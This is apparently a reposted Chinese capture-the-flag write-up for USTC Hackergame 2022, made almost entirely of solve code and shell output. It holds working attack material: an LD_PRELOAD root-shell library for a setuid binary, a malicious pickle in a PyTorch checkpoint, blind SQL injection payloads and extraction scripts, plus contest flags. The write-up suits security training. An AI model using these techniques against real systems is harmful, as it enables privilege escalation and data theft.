# 2022 USTC Hackergame WriteUp 0x03

> 原文: https://www.ctfiot.com/71369.html
> ID: 71369

推荐阅读：

2022蓝帽杯遇见的 SUID 提权 总结篇

CobaltStrike beacon二开指南

Edge浏览器-通过XSS获取高权限从而RCE

The End of AFR?

java免杀合集

跳跳糖持续向广大安全从业者征集高质量技术文章，可以是漏洞分析，事件分析，渗透技巧，安全工具等等。

通过审核且发布将予以500RMB-1000RMB不等的奖励，具体文章要求可以查看“投稿须知”。

阅读更多原创技术文章，戳“阅读全文”


```
$ stty raw -echo; nc 202.38.93.111 10338; stty sane
Please input your token:
SeaBIOS (version 1.14.0-2)

iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+0FF8F360+0FECF360 CA00

Booting from ROM...
[    5.616162] Dev sda: unable to read RDB block 1
[    5.621327] Dev sda: unable to read RDB block 1
/ $ ls -al
total 32
drwxrwxr-x   15 1000     1000             0 Oct 25 09:07 .
drwxrwxr-x   15 1000     1000             0 Oct 25 09:07 ..
-rw-------    1 1000     1000             8 Oct 25 09:07 .ash_history
drwxr-xr-x    2 1000     1000             0 Oct 15 18:20 bin
---s--x--x    1 0        0            20352 Oct 15 18:20 chall
drwxr-xr-x    8 0        0             2980 Oct 25 09:07 dev
drwxr-xr-x    3 1000     1000             0 Oct 15 18:20 etc
-r--------    1 1337     1337           512 Oct 25 09:07 flag2
drwxr-xr-x    2 1000     1000             0 Oct  5 17:13 home
-rwxr-xr-x    1 1000     1000            27 Oct  5 17:13 init
drwxr-xr-x    2 1000     1000             0 Oct  5 17:13 lib
drwxr-xr-x    2 1000     1000             0 Oct 15 18:20 lib64
lrwxrwxrwx    1 1000     1000            11 Oct 15 18:20 linuxrc -> bin/busybox
dr-xr-xr-x  118 0        0                0 Oct 25 09:07 proc
drwx------    2 0        0                0 Sep 16 14:50 root
drwxr-xr-x    2 1000     1000             0 Oct 15 18:20 sbin
dr-xr-xr-x   13 0        0                0 Oct 25 09:07 sys
drwxrwxrwt    2 0        0               40 Oct 25 09:07 tmp
drwxr-xr-x    8 1000     1000             0 Oct 15 18:20 usr
drwxr-xr-x    3 1000     1000             0 Oct 15 18:20 var
/ $ mount
rootfs on / type rootfs (rw)
none on /proc type proc (rw,relatime)
none on /sys type sysfs (rw,relatime)
none on /sys/kernel/debug type debugfs (rw,relatime)
devtmpfs on /dev type devtmpfs (rw,relatime,size=89988k,nr_inodes=22497,mode=755,inode64)
none on /tmp type tmpfs (rw,relatime,inode64)
/ $ df -h
Filesystem                Size      Used Available Use% Mounted on
devtmpfs                 87.9M         0     87.9M   0% /dev
none                    109.7M         0    109.7M   0% /tmp
/ $ free -h
              total        used        free      shared  buff/cache   available
Mem:         219.3M       16.2M       76.2M           0      126.9M       86.2M
Swap:             0           0           0
/ $ uname -a
Linux (none) 5.19.9 #1 SMP PREEMPT_DYNAMIC Fri Sep 16 14:49:59 UTC 2022 x86_64 GNU/Linux
/ $ ps -ef
PID   USER     TIME  COMMAND
    1 0         0:01 init
    2 0         0:00 [kthreadd]
    3 0         0:00 [rcu_gp]
    4 0         0:00 [rcu_par_gp]
    5 0         0:00 [netns]
    6 0         0:00 [kworker/0:0-eve]
    7 0         0:00 [kworker/0:0H-ev]
    8 0         0:03 [kworker/u2:0-ev]
    9 0         0:00 [kworker/0:1H-ev]
   10 0         0:00 [mm_percpu_wq]
   11 0         0:00 [rcu_tasks_kthre]
   12 0         0:00 [rcu_tasks_rude_]
   13 0         0:00 [rcu_tasks_trace]
   14 0         0:00 [ksoftirqd/0]
   15 0         0:00 [rcu_preempt]
   16 0         0:00 [migration/0]
   17 0         0:00 [idle_inject/0]
   18 0         0:00 [kworker/0:1-eve]
   19 0         0:00 [cpuhp/0]
   20 0         0:00 [kdevtmpfs]
   21 0         0:00 [inet_frag_wq]
   22 0         0:00 [kauditd]
   23 0         0:00 [khungtaskd]
   24 0         0:00 [kworker/u2:1-ev]
   25 0         0:00 [oom_reaper]
   26 0         0:00 [writeback]
   27 0         0:00 [kworker/u2:2-ev]
   28 0         0:00 [kcompactd0]
   29 0         0:00 [ksmd]
   30 0         0:00 [kintegrityd]
   31 0         0:00 [kblockd]
   32 0         0:00 [blkcg_punt_bio]
   33 0         0:00 [tpm_dev_wq]
   34 0         0:00 [ata_sff]
   35 0         0:00 [md]
   36 0         0:00 [edac-poller]
   37 0         0:00 [devfreq_wq]
   38 0         0:00 [watchdogd]
   39 0         0:00 [kswapd0]
   40 0         0:00 [ecryptfs-kthrea]
   42 0         0:00 [kworker/u2:3-ev]
   47 0         0:00 [kthrotld]
   51 0         0:00 [acpi_thermal_pm]
   52 0         0:00 [xenbus_probe]
   53 0         0:00 [scsi_eh_0]
   54 0         0:00 [scsi_tmf_0]
   55 0         0:00 [scsi_eh_1]
   56 0         0:00 [scsi_tmf_1]
   57 0         0:00 [vfio-irqfd-clea]
   58 0         0:00 [mld]
   59 0         0:00 [ipv6_addrconf]
   64 0         0:00 [kstrp]
   70 0         0:00 [zswap-shrink]
   71 0         0:00 [kworker/u3:0]
  116 0         0:00 [charger_manager]
  117 0         0:00 {rcS} /bin/sh /etc/init.d/rcS
  131 1000      0:00 /bin/sh
  141 1000      0:00 ps -ef
/etc/init.d/rcS
#! /bin/sh

mkdir -p /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t debugfs none /sys/kernel/debug
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp
mdev -s

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

chown 0:0 /chall
chmod 04111 /chall

cat /dev/sda > /flag2
chown 1337:
1337 /flag2
chmod 0400 /flag2

setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /tmp

poweroff -d 0  -f
/ $ rm /sbin/poweroff
/ $ exit
/etc/init.d/rcS: line 28: poweroff: not found

Processing /etc/profile... Done

/ # id
uid=0 gid=0
/ # cat /flag2
flag{D0_n0t_O0o0pen_me__unles5_u_tr4aced_my_p4th_8f2b6f5d67}
/ # tail /chall
# ...
flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}
/ $ ls -lR /lib64
/lib64:
total 21492
-rwxr-xr-x    1 1000     1000       1299736 Oct  5 17:13 ld-linux-x86-64.so.2
-rwxr-xr-x    1 1000     1000         32368 Oct  5 17:13 libBrokenLocale.so.1
-rwxr-xr-x    1 1000     1000         20808 Oct  5 17:13 libanl.so.1
-rwxr-xr-x    1 1000     1000      12325888 Oct  5 17:13 libc.so.6
-rwxr-xr-x    1 1000     1000        193288 Oct  5 17:13 libc_malloc_debug.so.0
-rwxr-xr-x    1 1000     1000        132808 Oct  5 17:13 libcrypt.so.1
-rwxr-xr-x    1 1000     1000         22160 Oct  5 17:13 libdl.so.2
-rwxr-xr-x    1 1000     1000       3472568 Oct  5 17:13 libm.so.6
-rwxr-xr-x    1 1000     1000         53240 Oct  5 17:13 libmemusage.so
-rwxr-xr-x    1 1000     1000       2845520 Oct  5 17:13 libmvec.so.1
-rwxr-xr-x    1 1000     1000        513816 Oct  5 17:13 libnsl.so.1
-rwxr-xr-x    1 1000     1000        170728 Oct  5 17:13 libnss_compat.so.2
-rwxr-xr-x    1 1000     1000        151640 Oct  5 17:13 libnss_db.so.2
-rwxr-xr-x    1 1000     1000         20024 Oct  5 17:13 libnss_dns.so.2
-rwxr-xr-x    1 1000     1000         20024 Oct  5 17:13 libnss_files.so.2
-rwxr-xr-x    1 1000     1000         77752 Oct  5 17:13 libnss_hesiod.so.2
-rwxr-xr-x    1 1000     1000         23416 Oct  5 17:13 libpcprofile.so
-rwxr-xr-x    1 1000     1000         21864 Oct  5 17:13 libpthread.so.0
-rwxr-xr-x    1 1000     1000        253048 Oct  5 17:13 libresolv.so.2
-rwxr-xr-x    1 1000     1000         27344 Oct  5 17:13 librt.so.1
-rwxr-xr-x    1 1000     1000        266656 Oct  5 17:13 libthread_db.so.1
-rwxr-xr-x    1 1000     1000         20816 Oct  5 17:13 libutil.so.1
/ $ find / -perm -u=s -type f 2>err
/chall
/ $ /lib64/ld-linux-x86-64.so.2
/lib64/ld-linux-x86-64.so.2: missing program name
Try '/lib64/ld-linux-x86-64.so.2 --help' for more information.
/ $ /lib64/libc.so.6 
GNU C Library (GNU libc) stable release version 2.36.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
<https://www.gnu.org/software/libc/bugs.html>.
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

void _init()
{
    unsetenv("LD_PRELOAD");
    // setresuid(0, 0, 0);
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
echo -ne 'xdexadxbexef' > 1.so
# or
echo -n  | base64 -d > 1.so
# or
echo -n <tar+base64encoded_str> | base64 -d > 1.tar.gz
tar -zxvf 1.tar.gz
LD_Preload=/1.so /chall
# tar -zcvf shell.tar.gz shell.so
# base64 shell.tar.gz -w 0
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
AFAAAA==
/ $ cat > 1
H4sIAAAAAAAAA+2b32...
^C
/ $ base64 -d 1 > 1.tar.gz
/ $ tar -zxvf 1.tar.gz 
shell.so
/ $ echo '/shell.so' > /etc/ld.so.preload
/ $ ./chall 
/ # id
uid=0 gid=0 groups=1000
/ # strings /chall | grep flag
flag{ptr4ce_m3_4nd_1_w1ll_4lways_b3_th3r3_f0r_u}
tmp_flag
/ # cat /flag2
flag{D0_n0t_O0o0pen_me__unles5_u_tr4aced_my_p4th_8f2b6f5d67}
import os
from pwn import *
import binascii
# context(log_level="DEBUG")

io = remote("202.38.93.111", 10338)
io.recvuntil(b'token: ')
io.sendline(b'xxxxxxxxxxxxxxxx')
io.recvuntil(b'/ $ x1bx5bx36x6e')
io.sendline(b"ls -al")
io.recvuntil(b'/ $ x1bx5bx36x6e')
# io.interactive()

b = open("./shell.so", 'rb').read()
bb = binascii.hexlify(b)
c = b''
print(bb[:20], len(bb))
# 29520
devided_bb = [bb[500*i:
500*(i+1)] for i in range(len(bb)//500 + 1)]
print(devided_bb[:2])

for x in devided_bb:
    c = [b'\x' + x[i:i+2] for i in range(0, len(x), 2)]
    payload = b"echo -ne '" + b"".join(c) + b"' >>1.so"
    # c = rb"x" + rb"x".join(x[n : n+2] for n in range(0, len(x), 2))
    # payload = b"echo -ne '" + c + b"' >> 1.so"
    print(f"[+] length: {len(payload)}")
    io.sendline(payload)
    io.recvuntil(b'/ $ x1bx5bx36x6e')

io.sendline(b"echo '/1.so' > /etc/ld.so.preload")
io.recvuntil(b'/ $ x1bx5bx36x6e')
io.sendline(b"/chall")
# io.recvuntil(b'/ $ x1bx5bx36x6e')

io.interactive()
# pstree
init---rcS---sh---chall---sh---pstree
python3 -m pickletools data.pkl
import io
import json
import base64

import torch
import matplotlib
import matplotlib.image

from models import SimpleGenerativeModel

def infer(pt_file):
    # load input data
    tag_ids = torch.load("dataset/tags_10.pt", map_location="cpu")

    # args
    n_tags = 63
    dim = 8
    img_shape = (64, 64, 3)

    # load model
    model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)
    model.load_state_dict(torch.load(pt_file, map_location="cpu"))

    # generate noise
    torch.manual_seed(0)
    n_samples = tag_ids.shape[0]
    noise = torch.randn(n_samples, dim)

    # forward
    with torch.no_grad():
        model.eval()
        predictions = model(noise, tag_ids).clamp(0, 1)

    gen_imgs = []
    for i in range(n_samples):
        out_io = io.BytesIO()
        matplotlib.image.imsave(out_io, predictions[i].numpy(), format="png")
        png_b64 = base64.b64encode(out_io.getvalue()).decode()
        gen_imgs.append(png_b64)

    # save the predictions
    json.dump({"gen_imgs_b64": gen_imgs}, open("/tmp/result.json", "w"))

if __name__ == "__main__":
    infer(open("checkpoint/model.pt", "rb"))
    print(open("/tmp/result.json", "r").read())
import base64
import json

def gen():
    gen_imgs = []
    for i in range(10):
        with open(f'{i}.png', 'rb') as f:
            file = f.read()
        x = base64.b64encode(file).decode()
        gen_imgs.append(x)
    json.dump({"gen_imgs_b64": gen_imgs}, open("result.json", "w"))

gen()
import torch
from models import SimpleGenerativeModel

class Miao(object):
    def __reduce__(self):
        import os
        return os.system, ("""echo '{"gen_imgs_b64": ["iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAOXRF...' > /tmp/result.json""",)
        # return os.system, ("calc",)

# model = {'a': torch.tensor([1., 2.]), 'b': Miao()}
pt_file = "checkpoint/modelold.pt"
model = torch.load(pt_file, map_location="cpu")
model['aaa'] = Miao()
print(model)
torch.save(model, 'tensor_dict.pt')
# print(torch.load('tensor_dict.pt'))
flag{Torch.Load.Is.Dangerous-0eeae735d2}
# pip install captcha==0.4
# Reference env: Debian 10 (buster) + Python 3.10.4

from captcha.image import ImageCaptcha
import random

def generate_captcha(riskness: int):

    digits = "0123456789"
    letters = "abcdefghijkmnpqrtuvwxy" + "ABCDEFGHJKLMNPQRTVWXY"

    def rstr(alphabet, length):
        return "".join(random.choice(alphabet) for _ in range(length))

    riskness_lut = {
        # (digits, letters)
        1: (9, 0),
        2: (8, 1),
        3: (7, 2),
        4: (6, 3),
        5: (5, 4),
        6: (4, 5),
        7: (3, 6),
        8: (2, 7),
        9: (0, 9),
    }

    cap_str = ""

    cap_str += rstr(digits, riskness_lut[riskness][0])
    cap_str += rstr(letters, riskness_lut[riskness][1])

    ImageCaptcha(width=160 * 2).write(cap_str, f"./test-{riskness}.png")

if __name__ == "__main__":
    # Example:
    # Simple-1
    generate_captcha(1)
    # OP-9
    generate_captcha(9)
POST / HTTP/1.1
Host: 202.38.93.111:
11230
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------38996277892281742141460984843
Content-Length: 294
Origin: http://202.38.93.111:
11230
Connection: keep-alive
Referer: http://202.38.93.111:
11230/
Cookie: session=.xxxxxxxx
Upgrade-Insecure-Requests: 1

-----------------------------394531739015132568631651929142
Content-Disposition: form-data; name="name"

Azusa-3
-----------------------------394531739015132568631651929142
Content-Disposition: form-data; name="cap"

123456
-----------------------------394531739015132568631651929142--
POST /captcha HTTP/1.1
Host: 202.38.93.111:
11230
Content-Length: 31
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://202.38.93.111:
11230
Referer: http://202.38.93.111:
11230/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=xxxxxxxxxxxxxxxxxxxxxxxxxx
Connection: close

username=Simple-1
username=Simple-1'+and+1%3d1--+a
username=Simple-1'+and+1%3d2--+a
username=Simple-1'+order+by+1--%2ba   //纯数字
username=Simple-1'+order+by+2--%2ba   //字母
username=Simple-1'+and+1%3d2+UNION+SELECT+3--+a
username=Simple-1'+and+1%3d2+UNION+SELECT+(sqlite_version()>1)--+a
username=Simple-1'+and+(select+count(tbl_name)+from+sqlite_master+where+type%3d"table")=2--+a
username=Simple-1'+and+(select+length(tbl_name)+from+sqlite_master+where+type%3d"table")=5--+a
username=Simple-1'+and+(select+length(tbl_name)+from+sqlite_master+where+type%3d"table"+and+length(tbl_name)<>5)=4--+a
username=Simple-1'+and+(select+tbl_name+from+sqlite_master+where+type%3d"table"+and+length(tbl_name)%3d4)%3d"flag"--+a
username=Simple-1'+and+(select+substr(flag,1,5)+from+flag)%3d"flag{"--+a
username=Simple-1'+and+(select+length(flag)+from+flag)=20--+a
payload = f"""Simple-1' and (select substr(flag,{i},1) from flag)<'{chr(mid)}'-- a"""
payload = f"""Simple-1' and (select substr(flag,{i},1) from flag)<char({mid})-- a"""
#-*-coding:
utf-8-*-
import requests
import base64
import cv2
import numpy as np
import matplotlib.pyplot as plt
from PIL import Image
from io import BytesIO

host = "http://202.38.93.111:
11230/captcha"
headers = {
    # "Connection": "close",
    # "X-Requested-With": "XMLHttpRequest",
    # "Origin": "http://202.38.93.111:
11230",
    # "Referer": "http://202.38.93.111:
11230/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
    "Cookie": "session=xxxxxxxxxxxxxx"
}

def get_flag():
    ans = ''
    # plt.figure()
    # plt.show()
    plt.ion()  # 打开交互模式
    for i in range(6, 20):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            # payload = f"""Simple-1' and (select substr(flag,{i},1) from flag)<'{chr(mid)}'-- a"""  # flag{JiJid0;;cccc2;}
            payload = f"""Simple-1' and (select substr(flag,{i},1) from flag)<char({mid})-- a"""
            # payload = """Simple-1' and (select substr(flag,14,5) from flag)='cccc2'-- a"""
            print(payload)
            param = {"username": payload}
            res = requests.post(host, data=param, headers=headers)
            # print(res.text)
            res_img = res.json()["result"]
            img_bytes = base64.b64decode(res_img)
            nparr = np.frombuffer(img_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.COLOR_BGR2RGB)
            plt.imshow(img)
            # plt.show()
            # img = Image.open(BytesIO(img_bytes))
            # img.show()
            choise = input('1/0:')
            plt.clf()
            if choise == '1':
                high = mid
            else:
                low = mid+1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid-1)
        print("[!] -------> " + ans)
    plt.ioff()

def get_flag_hex():
    ans = ''
    # plt.figure()
    # plt.show()
    plt.ion()  # 打开交互模式
    for i in range(37, 41):
        for j in range(16):
            payload = f"""Simple-1' and (select substr(hex(flag),{i},1) from flag)='{hex(j)[2:]}'-- a"""
            print(payload)
            param = {"username": payload}
            res = requests.post(host, data=param, headers=headers)
            # print(res.text)
            res_img = res.json()["result"]
            img_bytes = base64.b64decode(res_img)
            nparr = np.frombuffer(img_bytes, np.uint8)
            img = cv2.imdecode(nparr, cv2.COLOR_BGR2RGB)
            plt.imshow(img)
            # plt.show()
            # img = Image.open(BytesIO(img_bytes))
            # img.show()
            choise = input('1/0:')
            plt.clf()
            if choise == '1':
                ans += str(j)
                break
        print("[!] -------> " + ans)
    plt.ioff()

get_flag()
# flag{JiJid0;;cccc2;}
# flag{JiJid089cccc29}

# get_flag_hex()
# 3839636
flag{JiJid089cccc29}
#!/usr/bin/python3

# Th siz of th fil may reduc after XZRJification

from base64 import urlsafe_b64encode
from hashlib import sha384
from hmac import digest
from sys import argv

def check_equals(left, right):
    # check whether left == right or not
    if left != right: 
        exit(0x01)
        # print("[-] NO!")
    # else:
        # print("[+] OK!")

def sign(fil: str):
    with open(fil, 'rb') as f:
        # import secret
        secret = b'ustc.edu.cn'
        # print(len(secret))
        check_equals(len(secret), 39)
        # check secret hash
        secret_sha384 = 'ec18f9dbc4aba825c7d4f9c726db1cb0d0babf47f' +
                        'a170f33d53bc62074271866a4e4d1325dc27f644fdad'
        # print(len(secret_sha384))
        # 85
        # x = sha384(secret).hexdigest()
        # print(len(x), x)
        # 96 
        # 063c166942a2208c72d902a8506879d92be2de3e309437a2a9255d32e0b7b7dd939eb41f1e635c6e216f1fdbef59305f
        # check_equals(sha384(secret).hexdigest(), secret_sha384)
        # generat th signatur
        return digest(secret, f.read(), sha384)

if __name__ == '__main__':
    try:
        # check som obvious things
        # check_equals('creat', 'cre' + 'at')
        # check_equals('referer', 'refer' + 'rer')
        # generat th signatur
        # check_equals(len(argv), 2)
        # print(argv)
        sign_b64 = urlsafe_b64encode(sign(argv[1]))
        print('HS384 sign:', sign_b64.decode('utf-8'))
    
except (SystemExit, Exception):
        print('Usag' + 'e: HS384.py <fil' + 'e>')
from difflib import SequenceMatcher
from base64 import urlsafe_b64encode
from hashlib import sha384
from hmac import digest

def search_all(depth, first):
    # l = [[]]*3  # 不行，改了一个其他的跟着变
    # l = [[],[],[]]
    l = [[] for _ in range(depth)]
    results = []

    def search(depth, first):
        for i in range(first, -1, -1):
            # print('-' * depth + str(i))
            l[depth-1].append(i)
            if depth == 1:
                n = [x[-1] for x in reversed(l)]
                # print('===> ', n)
                results.append(n)
                return
            j = first - i
            search(depth-1, j)
    search(depth, first)
    # print(len(results))
    # 98280
    return results

letter = "aeiou"
secret_init = 'ustce.edu.cn'
# len(secret_init)  # 13
# l = secret_init.split('.')
# 39-12=27, stc d cn, 6个可能位

results = search_all(6, 27)
results2 = [[x+1 for x in i] for i in results]
for result in results2:
    secret = f"u{'s'*result[0]}{'t'*result[1]}{'c'*result[2]}e.e{'d'*result[3]}u.{'c'*result[4]}{'n'*result[5]}"
    assert len(secret) == 39
    print(secret)
    dig = sha384(secret.encode()).hexdigest()

    s = SequenceMatcher(lambda x: x == " ",
                        "ec18f9dbc4aba825c7d4f9c726db1cb0d0babf47fea170f33d53bc62074271866a4e4d1325dc27f644fdad", dig)
    ratio = s.ratio()
    print(ratio)
    if ratio > 0.6:
        print('[!] Find!!!!!!!!!', secret, dig)
        break
else:
    print('No...')
# [!] Find!!!!!!!!! 
# usssttttttce.edddddu.ccccccnnnnnnnnnnnn 
# eccc18f9dbbc4aba825c7d4f9cccce726db1cb0d0babffe47fa170fe33d53bc62074271866a4e4d1325dc27f644fddad
# python HS384_fix.py HS384-1.bin
HS384 sign: 7RKoDdKRy9SjCy0ubgtPkPC-i7gmAOV9CPZgYYGZ_92QDVdDA7BeBscJiM2DneBA

# python HS384_fix.py HS384-2.bin
HS384 sign: s5xAqgaYMwYEuN4giUc0shW_g_uXBAyWdTcCfYdyg76MDIXjRqRNAuFAqI8aAkco

# python HS384_fix.py HS384-3.bin
HS384 sign: 2HvQAcSrxrRIdPRTOgjWKNo6BPyainBAJgSEBXOk_czBK9dKn2u2iNLhBE86qyW
flag{y0u-kn0w-h0w-t0-sav3-7h3-l3773rs-r1gh7-3f5481d4a1092893}
import random

state = [random.randrange(2) for _ in range(128)]
basis = ['+'] * 128
z = [{'real': 1, 'imag': 0}, {'real': 0, 'imag': 1}]
qubits = [z[s] for s in state]

print(''.join(basis))
print(''.join(map(str,state)))
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# 11101000110011010010111101000000001000010001111001110010111111101001011011111010101010111010000000001110001000100111010001000101

res = "xx+xx++++x+x+xx++xx++x+xx+++++x+xx+x+xxxx++++x+++xxxx+x+x+++xx++++xxx+++xx+xx+xxxxxx+xxxx+x+xx++xx+xxx+++xxx++xxxxxx+x+++x++xx++"
bits = [s for s, b in zip(state, res) if b == '+'][:
128]
print(''.join(map(str,bits)))
# 100010110011100000100011100001111010110101000001000000000001
011001100110110001100001011001110111101100110010001100100011001000110100011000100011100000110001...
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667794782.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667794783.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/10-1667794784.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667794784.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1667794785.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1667794786.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1667794787.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1667794788.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1667794789.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667794789.png)